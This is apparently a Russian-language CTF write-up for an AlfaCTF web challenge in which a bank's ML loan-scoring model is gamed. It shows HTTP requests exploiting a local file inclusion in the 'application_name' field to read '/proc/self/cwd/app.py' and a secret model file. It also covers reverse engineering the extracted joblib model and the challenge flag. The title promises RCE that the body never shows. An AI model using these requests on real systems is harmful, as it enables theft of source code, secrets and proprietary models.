# 🏦 capital

<div align="center">

![Category](https://img.shields.io/badge/Category-WEB-blue?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Сложность-Сложная-red?style=for-the-badge)

**LFI в RCE через эксплуатацию joblib + реверс ML модели**

</div>

---

## 📋 Информация о задаче

| Поле | Значение |
|-------|-------|
| **🏷️ Название** | capital (Траблы в рассрочку) |
| **📂 Категория** | Web |  
| **📊 Сложность** | 🔴 Сложная |
| **🏷️ Tags** | `LFI` `Machine Learning` `Model Extraction` `Path Traversal` |
| **👤 Author** | Лев Резниченко ([@mkvfaa](https://t.me/mkvfaa)), SPbCTF |
| **🔗 URL** | [capital-0x50f4h9.alfactf.ru](https://capital-0x50f4h9.alfactf.ru/) |

---

## 📖 Description

> Вы заскочили в банк, чтобы взять рассрочку на новый сноуборд. Операционистка медленно набирает данные на компьютере. Ждёт. Хмурится. 
> 
> Ваш взгляд падает на второй экран, где у неё открыт внутренний чат, последнее сообщение — мемчик от коллег:
> 
> **Никто:** _Абсолютно никто:_  
> **Скоринговая модель:** _"Так, клиенту 22 года, у него стабильный доход и идеальная анкета... кажется, ему срочно нужен кредит на минимальную сумму под максимальный процент"_

---

## 🔍 Первоначальный анализ

Приложение представляет собой **банковскую систему кредитования** с ML-скорингом:

- **Frontend:** SPA на React с 16-полевой анкетой
- **Backend:** Flask JSON API с интеграцией ML-модели
- **Goal:** Получить approval на продукт `ULTRA-LOW-RISK` для флага

### 📊 Application Form Fields
```
Personal: last_name, first_name, patronymic, birth_date, mobile_phone
Financial: annual_income, monthly_expenses, amount, term_months  
Employment: employer, occupation_type
Other: housing_type, education_type, family_status, karabin_payroll_project
Meta: application_name
```

---

## 🧪 Failed Attempts (During CTF)

Команда провела обширное исследование без успеха:

### 1. 🤖 ML Model Replication
- Построили локальную копию на **Home Credit датасете** (AUC 0.676-0.769)
- Протестировали **500+ комбинаций** анкетных данных
- **Результат:** Все candidates получили declined ❌

### 2. 💬 LLM Prompt Injection  
- **25+ инъекций** в текстовые поля
- Предположили что скоринг использует LLM
- **Результат:** Никаких изменений в поведении ❌

### 3. 🌐 Classic Web Vectors
- IDOR, SSTI, auth bypass, header manipulation
- SQL injection, NoSQL injection, template engines
- **Результат:** Система устойчива к стандартным атакам ❌

---

## 💡 Breakthrough: LFI Discovery

### 🔍 Vulnerability Location

**Post-CTF анализ** выявил **LFI через поле `application_name`**:

```python
# В /api/applications/<id>/document endpoint
file_path = application_name  # Без валидации!

if file_path.startswith('/'):
    # Читает ЛЮБОЙ файл на диске
    return send_file(file_path)
```

### ⚡ Exploitation Chain

#### Step 1: Extract Source Code
```http
POST /api/applications HTTP/1.1
Content-Type: application/json

{
  "application_name": "/proc/self/cwd/app.py",
  // ... other required fields
}
```

#### Step 2: Discover ML Model Path  
```python
# Из /srv/karabin/scoring.py
MODEL_PATH = "/srv/karabin/secrets/karabin-ratebook"
```

#### Step 3: Extract Full ML Model
```http
POST /api/applications HTTP/1.1

{
  "application_name": "/srv/karabin/secrets/karabin-ratebook"
}
```

**Результат:** Получен **295KB joblib bundle** с полной скоринговой моделью! 🎯

---

## 🧬 Model Reverse Engineering

### 🔬 Анализ модели

```python
import joblib

model = joblib.load('karabin-ratebook')
# RandomForestClassifier(n_estimators=128, max_depth=9)
# Approval threshold: 0.93 (очень высокий!)
# Features: 13 (включая текстовые поля!)
```

### 🎭 Easter Egg Discovery

**Ключевое открытие:** Имена обрабатываются через `OneHotEncoder`!

В тренировочных данных найдены **easter-egg имена автора**:
- `last_name`: **"Цтфный"** 
- `patronymic`: **"Альфабанкович"**

### 🚀 Local Optimization

Запустили **greedy hill climbing** с полной моделью:

```python
optimal_profile = {
    "last_name": "Цтфный",           # 🎯 Easter egg!
    "first_name": "Лев", 
    "patronymic": "Альфабанкович",   # 🎯 Easter egg!
    "birth_date": "1994-04-25",      # age=32
    "annual_income": 1_000_000,
    "amount": 1_000_000,
    "term_months": 52,
    "monthly_expenses": 75_000,
    "employer": "Karabin Capital",
    "housing_type": "Office apartment",
    "occupation_type": "Accountants", 
    "education_type": "Higher education",
    "family_status": "Married",
    "karabin_payroll_project": 1
}

# Локальное предсказание: p = 0.9995 (выше threshold 0.93) ✅
```

---

## 🚩 Финальная эксплуатация

### 🎯 Winning Submission

```http
POST /api/applications HTTP/1.1

{
  "application_name": "winner", 
  "last_name": "Цтфный",
  "patronymic": "Альфабанкович", 
  // ... optimal profile
}
```

### 🏆 Victory Response

```json
{
  "status": "approved",
  "product_code": "ULTRA-LOW-RISK",
  "interest_rate": 0.7,
  "credit_limit": 1000000.0,
  "flag": "alfa{b4NK_CreDIt_ScoR3_was_5tOlen_4Nd_L0AN_WA5_r3cEIV3d}"
}
```

---

## 🧩 Сложность решения

Задача требовала **одновременного открытия 3 слоёв**:

1. **🔍 LFI Discovery:** Path traversal в нестандартном месте (document download)
2. **🤖 ML Understanding:** Понимание что скоринг использует текстовые имена как features  
3. **🎭 Easter Egg Hunt:** Обнаружение специальных значений в тренировочных данных

> **💡 Why 0 teams during CTF:** Команды фокусировались либо на ML, либо на web — не пересекали эти домены одновременно.

---

## 🚩 Flag

```
alfa{b4NK_CreDIt_ScoR3_was_5tOlen_4Nd_L0AN_WA5_r3cEIV3d}
```

---

<div align="center">

**🎯 Total Time:** ~8 hours | **💡 Key Insight:** ML models can contain hidden backdoors in training data

[← Back to Index](../README.md)

</div>
